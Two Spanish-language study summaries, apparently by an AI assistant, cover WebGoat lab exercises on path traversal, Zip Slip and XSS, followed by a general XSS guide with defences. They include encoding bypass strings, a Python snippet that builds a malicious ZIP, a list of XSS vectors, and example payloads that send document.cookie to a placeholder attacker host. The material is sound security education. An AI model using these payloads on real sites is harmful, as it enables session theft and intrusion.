Aquí tienes un resumen **extenso y detallado** de todo lo que vimos, incluyendo **Path Traversal**, **Zip Slip** y **XSS**. Está pensado para que puedas repasar, entender los conceptos y responder cualquier pregunta técnica.

---

# 🔥 Resumen Completo – WebGoat: Path Traversal, Zip Slip y XSS

---

## 1. Path Traversal (Directory Traversal)

### 🎯 Definición
Vulnerabilidad que permite a un atacante **leer o escribir archivos fuera del directorio previsto** por la aplicación. Se aprovecha de una validación insuficiente de las rutas de archivo proporcionadas por el usuario.

### 🧠 Cómo funciona
Las aplicaciones web suelen usar parámetros para leer archivos:
```
http://ejemplo.com/file=reporte.pdf
```
Un atacante modifica el parámetro para incluir secuencias `../` que "suben" en el árbol de directorios:
```
http://ejemplo.com/file=../../../../../etc/passwd
```
Esto permite leer archivos del sistema como `/etc/passwd` o incluso sobrescribir archivos si la app permite escritura.

### 🛡️ Bypasses comunes
- **URL encoding simple**: `../` → `%2e%2e%2f`
- **Doble URL encoding**: `%252e%252e%252f` (cuando hay dos sistemas decodificando)
- **Path absoluto**: `/etc/passwd`
- **Unicode/UTF-8**: `..%c0%af` o `..%ef%bc%8f`
- **Null byte** (menos común): `../../etc/passwd%00.jpg`
- **Técnicas avanzadas**: usar `....//` o `..././` para evadir filtros que buscan exactamente `../`

### 🧪 Ejercicios en WebGoat
#### a) Path Traversal al subir archivos
- **Objetivo**: Guardar un archivo fuera de la carpeta de perfil.
- **Solución**: Usar `../` en el nombre del archivo (`filename="../test.txt"`) y luego con bypasses cuando el campo `fullName` estaba sanitizado. Finalmente se logró con `fetch()` y JavaScript directo en la consola.

#### b) Path Traversal al leer archivos
- **Objetivo**: Leer `path-traversal-secret.jpg` que está en un directorio superior.
- **Truco**: El parámetro `id` en la URL permitía listar directorios y leer archivos.
- **Solución**: `id=%2e%2e%2f%2e%2e%2fpath-traversal-secret` (sin la extensión `.jpg` porque el filtro bloqueaba puntos).

### 🧰 Herramientas usadas
- `curl` para peticiones manuales
- `fetch()` en la consola del navegador para saltar validaciones del frontend
- Burp Suite / ZAP (aunque vimos que para WebGoat muchas veces es más rápido usar JS)

---

## 2. Zip Slip

### 🎯 Definición
Ataque que explota la extracción insegura de archivos **ZIP**. Similar al path traversal, pero ocurre al descomprimir archivos cuyas entradas contienen nombres con `../`.

### 📦 Ejemplo de ZIP malicioso
Dentro del ZIP, un archivo se llama:
```
../../../../tmp/evil.sh
```
Cuando el código Java extrae sin validar:
```java
File f = new File(destinationDir, e.getName());
```
El archivo se escribe en `/tmp/evil.sh` en lugar de la carpeta destino.

### 💣 Impacto
- Sobrescribir binarios del sistema (por ejemplo, `ls`) para conseguir **ejecución remota de comandos**.
- Sustituir archivos de configuración o scripts.

### 🛠️ Cómo crear un ZIP malicioso (Python)
```python
import zipfile
with zipfile.ZipFile('evil.zip', 'w') as z:
    z.writestr('../../../../ruta/deseada/archivo.txt', 'contenido')
```

### 🧪 Ejercicio WebGoat
- **Objetivo**: Sobrescribir la imagen de perfil.
- **Solución**: Se generó un ZIP con el nombre de entrada apuntando a la ruta exacta de la imagen a reemplazar.

---

## 3. Cross-Site Scripting (XSS)

### 🎯 Definición
Vulnerabilidad que permite a un atacante **inyectar código malicioso** (normalmente JavaScript) en páginas web vistas por otros usuarios. El navegador de la víctima ejecuta el código como si fuera legítimo.

### 🧨 Impacto
- Robo de cookies de sesión (`document.cookie`)
- Redirección a sitios de phishing
- Captura de credenciales (keyloggers)
- Modificación del contenido de la página
- Ejecución de acciones en nombre de la víctima

### 🕸️ Tipos de XSS

#### 1. Reflected XSS
- El script malicioso **viaja en la petición** (URL, formulario) y el servidor lo refleja en la respuesta.
- **Requiere interacción**: la víctima debe hacer clic en un enlace manipulado.
- Ejemplo:
  ```
  http://victima.com/buscar?q=<script>alert(1)</script>
  ```

#### 2. Stored XSS (Persistente)
- El script se **almacena en el servidor** (base de datos, comentarios, foros) y se ejecuta cada vez que un usuario visita la página afectada.
- **No requiere interacción activa** más allá de visitar la página.

#### 3. DOM-Based XSS
- La vulnerabilidad está en el **código JavaScript del lado cliente**. El script malicioso nunca llega al servidor.
- Suele ocurrir cuando el JavaScript toma valores de la URL (hash, fragmento) y los inserta en el DOM sin sanitizar.
- Ejemplo:
  ```javascript
  // Código vulnerable
  document.getElementById("resultado").innerHTML = location.hash.substring(1);
  ```

### 🛡️ Defensas
- **Sanitizar/escapar** todo input del usuario (HTML entities, URL encoding).
- Usar **Content Security Policy (CSP)** para limitar fuentes de scripts.
- Validar en servidor y cliente.
- No confiar en blacklists (mejor whitelists).
- Usar frameworks modernos que escapan por defecto (React, Angular).

### 🧪 Ejercicios en WebGoat
#### a) Reflected XSS (attack5a)
- **Objetivo**: Identificar campo vulnerable.
- **Solución**: Inyectar `<script>alert('XSS')</script>` en cada campo (QTY1-4, field1-2). Uno de ellos ejecutó el script.

#### b) DOM-Based XSS (attack6a)
- **Parte 1 – Encontrar ruta de test**: Analizando el código JavaScript se encontró que `DOMTestRoute=start.mvc#test/` era la ruta de prueba.
- **Parte 2 – Ejecutar función interna**: Usando la ruta `start.mvc#test/` se podía pasar un parámetro que se reflejaba en el DOM. Se usó:
  ```
  http://localhost:8080/WebGoat/start.mvc#test/javascript:webgoat.customjs.phoneHome()
  ```
  Esto ejecutó la función `phoneHome()` y devolvió un número aleatorio.

#### c) Quiz final
- 5 preguntas sobre conceptos clave de XSS (ver respuestas anteriores).

---

## 📌 Lecciones Aprendidas

| Vulnerabilidad | Causa raíz | Cómo se explota | Prevención |
|---------------|------------|-----------------|------------|
| Path Traversal | Falta de validación de rutas | `../` en parámetros de archivo | Normalizar rutas, usar whitelist |
| Zip Slip | Confianza en nombres dentro de ZIP | Archivo comprimido con `../` en el nombre | Validar cada entrada antes de extraer |
| XSS | Insertar datos de usuario sin escapar | Inyección de HTML/JavaScript | Escapar output, CSP, validación |

---

## 🧠 Consejos para entrevistas / exámenes

1. **Path Traversal**: Menciona siempre el uso de encoding (simple, doble) y path absoluto. Saber que afecta tanto a lectura como a escritura.
2. **Zip Slip**: Es un tipo de path traversal pero en contexto de archivos comprimidos. Destaca que puede llevar a RCE.
3. **XSS**:
   - Reflected vs Stored vs DOM.
   - ¿Es JavaScript el único vector? No, HTML, Flash, CSS.
   - ¿Un sitio HTTPS confiable es inmune? No, el navegador confía en el origen, no en el contenido.
   - ¿Cómo robar cookies? `document.cookie` y enviarlas a un servidor atacante.

---

¿Necesitas que profundice en algún tema en particular? ¿Pasamos a otro módulo?


-----

Aquí tienes un texto completo y estructurado sobre **Cross-Site Scripting (XSS)** que puedes usar para estudiar, presentar o repasar:

---

# Cross-Site Scripting (XSS)

## 1. ¿Qué es XSS?

Cross-Site Scripting (XSS) es una vulnerabilidad de seguridad web que permite a un atacante **inyectar código malicioso** (generalmente JavaScript) en páginas web vistas por otros usuarios. El navegador de la víctima ejecuta este código como si fuera parte legítima del sitio, porque confía en el origen del contenido.

A pesar de su nombre, XSS no se limita a JavaScript ni requiere múltiples sitios. El término se acuñó cuando los primeros ataques implicaban cargar scripts desde un sitio externo (cross-site), pero hoy el concepto abarca cualquier inyección de código ejecutable en el navegador.

---

## 2. ¿Por qué ocurre?

XSS ocurre cuando una aplicación web **toma datos proporcionados por un usuario y los incluye en una página web sin validarlos, sanitizarlos o escaparlos adecuadamente**. El navegador no puede distinguir entre el código legítimo del desarrollador y el código inyectado por el atacante.

**Ejemplo mínimo:**
```html
<!-- Código vulnerable en el servidor -->
<h1>Resultados para: <?= $_GET['busqueda'] ?></h1>
```

Si un atacante envía:
```
?busqueda=<script>alert('XSS')</script>
```

El HTML resultante será:
```html
<h1>Resultados para: <script>alert('XSS')</script></h1>
```

Y el navegador ejecutará el script.

---

## 3. Impacto y consecuencias

Un ataque XSS exitoso puede tener graves consecuencias:

| Consecuencia | Descripción |
|--------------|-------------|
| **Robo de sesiones** | El atacante roba cookies (`document.cookie`) y suplanta la identidad de la víctima. |
| **Phishing** | Se inyectan formularios falsos para capturar credenciales. |
| **Keylogging** | Se registran las teclas pulsadas por la víctima. |
| **Redirección maliciosa** | Se redirige a la víctima a sitios controlados por el atacante. |
| **Modificación del DOM** | Se altera el contenido visible de la página (noticias falsas, desinformación). |
| **Ejecución de acciones** | Se realizan peticiones HTTP en nombre de la víctima (transferencias, cambios de configuración). |
| **Propagación** | En XSS almacenado, el ataque se propaga automáticamente a todos los visitantes. |
| **Compromiso del navegador** | En casos extremos, se explotan vulnerabilidades del navegador para ejecutar código en el sistema operativo. |

---

## 4. Tipos de XSS

### 4.1 Reflected XSS (Reflejado)

**Definición:** El script malicioso viaja en la petición HTTP (URL, formulario) y el servidor lo "refleja" en la respuesta inmediata.

**Características:**
- No se almacena en el servidor.
- Requiere que la víctima haga clic en un enlace manipulado (ingeniería social).
- Se ejecuta una sola vez, en el contexto de la víctima.

**Ejemplo:**
```
https://banco.com/buscar?q=<script>fetch('https://atacante.com/robar?c='+document.cookie)</script>
```

**Ciclo de ataque:**
1. Atacante crea una URL maliciosa.
2. Atacante envía la URL a la víctima (email, mensaje, red social).
3. Víctima hace clic.
4. El servidor refleja el script en la respuesta.
5. El navegador de la víctima ejecuta el script.

---

### 4.2 Stored XSS (Almacenado / Persistente)

**Definición:** El script malicioso se **almacena permanentemente en el servidor** (base de datos, comentarios, perfiles, mensajes) y se ejecuta cada vez que un usuario solicita la página que lo contiene.

**Características:**
- El más peligroso de los tres tipos.
- No requiere interacción más allá de visitar la página afectada.
- Afecta a todos los usuarios que accedan al recurso contaminado.
- Puede propagarse viralmente.

**Ejemplo:** Un atacante publica un comentario en un foro:
```html
Me encanta este artículo! <script>new Image().src='https://atacante.com/log?c='+document.cookie</script>
```

Cada usuario que lea el comentario ejecutará el script sin saberlo.

**Ciclo de ataque:**
1. Atacante envía el payload malicioso a la aplicación (comentario, mensaje, perfil).
2. La aplicación almacena el payload sin sanitizar.
3. Una víctima solicita la página que contiene el payload.
4. El servidor entrega la página con el script inyectado.
5. El navegador de la víctima ejecuta el script.

---

### 4.3 DOM-Based XSS (Basado en DOM)

**Definición:** La vulnerabilidad reside en el **código JavaScript del lado cliente**. El payload nunca llega al servidor; todo ocurre en el navegador.

**Características:**
- Técnicamente es un subtipo de XSS reflejado.
- El servidor no puede detectarlo ni prevenirlo directamente.
- Suele ocurrir cuando JavaScript toma valores de la URL (fragmento `#`, `location.hash`) y los inserta en el DOM con funciones inseguras como `innerHTML` o `document.write()`.

**Ejemplo de código vulnerable:**
```javascript
// El desarrollador usa location.hash para mostrar un mensaje personalizado
document.getElementById('mensaje').innerHTML = decodeURIComponent(location.hash.substring(1));
```

**Ataque:**
```
https://sitio.com/pagina#<img src=x onerror=alert(document.cookie)>
```

**Ciclo de ataque:**
1. Atacante crea una URL con el payload en el fragmento (`#`).
2. Víctima hace clic en el enlace.
3. El servidor entrega la página normalmente (el fragmento no se envía al servidor).
4. El JavaScript del cliente procesa el fragmento e inserta el payload en el DOM.
5. El navegador ejecuta el código malicioso.

---

## 5. Comparativa de los tres tipos

| Característica | Reflected | Stored | DOM-Based |
|----------------|-----------|--------|-----------|
| ¿Dónde se almacena el payload? | En la URL | En el servidor (BD, archivos) | En el DOM del cliente |
| ¿Llega al servidor? | Sí | Sí | No necesariamente |
| ¿Requiere interacción? | Sí (clic en enlace) | No (solo visitar página) | Sí (clic en enlace) |
| ¿Persistencia? | No | Sí | No |
| ¿A quién afecta? | A quien hace clic | A todos los visitantes | A quien hace clic |
| ¿Detección en servidor? | Posible | Posible | Difícil (no pasa por servidor) |

---

## 6. Vectores de ataque comunes

No todo XSS requiere la etiqueta `<script>`. Existen múltiples vectores:

### 6.1 Etiquetas HTML
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">
<a href="javascript:alert(1)">Click</a>
```

### 6.2 Atributos de eventos
```html
<input onfocus=alert(1) autofocus>
<div onmouseover=alert(1)>Pasa el mouse</div>
<select onchange=alert(1)><option>1</option></select>
```

### 6.3 CSS y Style
```html
<div style="background:url(javascript:alert(1))">
<style>body{background:url('http://atacante.com/log')}</style>
```

### 6.4 Protocolos
```
javascript:alert(1)
data:text/html,<script>alert(1)</script>
vbscript:msgbox(1)
```

### 6.5 Flash, ActiveX y otros
Históricamente, objetos como Flash (`<embed>`, `<object>`) también podían ejecutar código malicioso.

---

## 7. Prevención y defensas

### 7.1 Regla de oro
**Nunca confíes en el input del usuario. Siempre valida, sanitiza y escapa.**

### 7.2 Escape según el contexto

| Contexto | Técnica |
|----------|---------|
| **HTML body** | Convertir `<` → `&lt;`, `>` → `&gt;`, `"` → `&quot;`, `'` → `&#x27;`, `&` → `&amp;` |
| **Atributos HTML** | Escapar comillas y usar atributos entre comillas siempre |
| **JavaScript** | Escapar barras, comillas y saltos de línea; usar `JSON.stringify()` |
| **URL** | Usar `encodeURIComponent()` |
| **CSS** | Validar y escapar caracteres peligrosos |

### 7.3 Content Security Policy (CSP)
Política declarada en headers HTTP que restringe qué recursos puede cargar y ejecutar el navegador:
```
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com
```
- Previene XSS aunque exista una vulnerabilidad.
- Bloquea scripts inline y eval().
- Es una capa adicional, no reemplaza el escape.

### 7.4 Otras defensas
- **HttpOnly cookies**: Las cookies con flag `HttpOnly` no son accesibles desde JavaScript (`document.cookie`).
- **Validación whitelist**: Solo permitir caracteres/contenidos esperados.
- **Sanitización con librerías**: DOMPurify, OWASP Java HTML Sanitizer.
- **Frameworks modernos**: React, Angular y Vue escapan por defecto el output.
- **X-XSS-Protection**: Header de seguridad (obsoleto, pero útil en navegadores antiguos).

---

## 8. Falsos mitos

| Mito | Realidad |
|------|----------|
| "Mi sitio usa HTTPS, estoy protegido contra XSS" | HTTPS cifra el tráfico pero no previene inyecciones. |
| "Solo JavaScript puede usarse para XSS" | HTML, CSS, Flash, VBScript y otros vectores existen. |
| "Los sitios de confianza son inmunes" | El navegador confía en el sitio, no puede distinguir código legítimo de malicioso. |
| "Un firewall (WAF) me protege completamente" | Los WAF se pueden bypassear; la defensa real está en el código. |
| "Si valido en el cliente, no necesito validar en el servidor" | La validación del cliente se salta fácilmente con herramientas como curl o Burp. |

---

## 9. Resumen visual

```
                          ┌──────────────────┐
                          │   APLICACIÓN WEB │
                          └────────┬─────────┘
                                   │
              ┌────────────────────┼────────────────────┐
              │                    │                    │
              ▼                    ▼                    ▼
     ┌────────────────┐  ┌────────────────┐  ┌────────────────┐
     │  REFLECTED XSS │  │  STORED XSS    │  │  DOM-BASED XSS │
     │                │  │                │  │                │
     │ Payload en URL │  │ Payload en BD  │  │ Payload en DOM │
     │ → Servidor     │  │ → Servidor     │  │ → Cliente      │
     │ → Respuesta    │  │ → Todos los    │  │ → No llega al  │
     │ → Víctima      │  │   visitantes   │  │   servidor     │
     └────────────────┘  └────────────────┘  └────────────────┘
```

---

## 10. Recursos recomendados

- **OWASP XSS Prevention Cheat Sheet**: [https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- **PortSwigger Web Security Academy – XSS**: [https://portswigger.net/web-security/cross-site-scripting](https://portswigger.net/web-security/cross-site-scripting)
- **Google XSS Game**: [https://xss-game.appspot.com/](https://xss-game.appspot.com/)

---

¿Quieres que agregue algo más o pasamos al siguiente tema?